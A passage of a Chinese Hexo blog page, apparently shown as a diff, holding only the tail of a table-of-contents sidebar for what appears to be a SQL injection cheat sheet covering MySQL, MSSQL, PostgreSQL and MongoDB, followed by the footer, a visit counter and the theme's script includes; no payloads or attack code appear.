class="nav-text">盲注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#报错"><span class="nav-number">3.2.3.</span> <span class="nav-text">报错</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#列名"><span class="nav-number">3.3.</span> <span class="nav-text">列名</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件操作"><span class="nav-number">4.</span> <span class="nav-text">文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#读取文件"><span class="nav-number">4.1.</span> <span class="nav-text">读取文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#写入文件"><span class="nav-number">4.2.</span> <span class="nav-text">写入文件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一些技巧"><span class="nav-number">5.</span> <span class="nav-text">一些技巧</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL"><span class="nav-number"></span> <span class="nav-text">MSSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#测试语句-1"><span class="nav-number">1.</span> <span class="nav-text">测试语句</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#信息获取-1"><span class="nav-number">1.1.</span> <span class="nav-text">信息获取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#数据信息-1"><span class="nav-number">1.2.</span> <span class="nav-text">数据信息</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#获取库名"><span class="nav-number">1.2.1.</span> <span class="nav-text">获取库名</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PostgreSQL"><span class="nav-number"></span> <span class="nav-text">PostgreSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MongoDB"><span class="nav-number"></span> <span class="nav-text">MongoDB</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Noel</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by"><!--
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>-->
+  <!--<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.4.2</div>-->
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="总访客量">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="总访问量">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.2"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
